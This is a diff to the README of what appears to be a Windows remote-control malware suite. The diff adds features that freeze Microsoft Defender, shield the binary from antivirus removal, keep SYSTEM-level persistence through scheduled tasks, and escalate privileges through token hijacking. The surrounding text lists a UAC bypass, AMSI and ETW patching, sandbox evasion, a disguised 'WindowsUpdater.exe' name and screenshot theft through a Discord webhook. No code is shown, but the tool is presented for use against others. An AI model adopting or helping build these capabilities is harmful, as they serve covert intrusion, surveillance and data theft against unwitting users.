@@ -43,7 +43,8 @@ Internal stealth engine using `computerdefaults.exe` hijack. Silently elevates t
 **👻 Deep Stealth & Evasion**
 - XOR-encrypted strings for all sensitive identifiers (API names, paths, URLs).
 - Anti-VM, Anti-Sandbox, and Analysis detection (MAC, BIOS, WMI, Process).
-- 20-second startup stall to bypass quick sandbox analysis.
+- **UnDefend v2 (Defender Freeze):** Low-level NT API locking of Defender database files to blind real-time protection.
+- **Binary Self-Protection:** Internal kernel-level file locking to prevent AV deletion/quarantine while active.
 - AMSI and ETW runtime patching / bypass.
 - Junk code injection for hash and signature randomization.
 - Invisible background execution with deceptive naming (`WindowsUpdater.exe`).
@@ -55,8 +56,8 @@ Visual live-updating UI (using WinForms overlaid on the CLI) for tracking CPU, R
 **📸 Discord Remote Screenshots**
 Instantly capture and exfiltrate screen captures directly to a Discord Webhook.
 
-**🔄 Auto-Persistence**
-Patches the Windows Run Registry for automatic startup upon reboot. Seamless update mechanism with System Mutex handling to prevent duplicate instances.
+**🔄 Auto-Persistence & ROOT Recovery**
+Patches the Windows Run Registry for automatic startup. Includes **Permanent ROOT Persistence** via high-integrity Scheduled Tasks, ensuring the suite reconnects as Administrator/SYSTEM automatically after a reboot. Seamless update mechanism with System Mutex handling to prevent duplicate instances.
 
 <br />
 
@@ -96,6 +97,8 @@ dotnet publish -c Release --runtime win-x64 --self-contained true -p:PublishSing
 | `mls` | Interactive visual menu to switch between targets. |
 | `/stats` | Opens live GUI charts for CPU, RAM, and Network. |
 | `/uacbypass` | Silently elevates privileges to ROOT/Administrator. |
+| `/freeze` | Manually triggers the UnDefend v2 Defender neutralization. |
+| `/getsystem` | Escalates to NT AUTHORITY\SYSTEM via stealthy Token Hijacking. |
 | `/screenshot` | Captures screen and sends to Discord Webhook. |
 | `/info` | Retrieves detailed `systeminfo`. |
 | `/list` | Retrieves running processes (`tasklist`). |
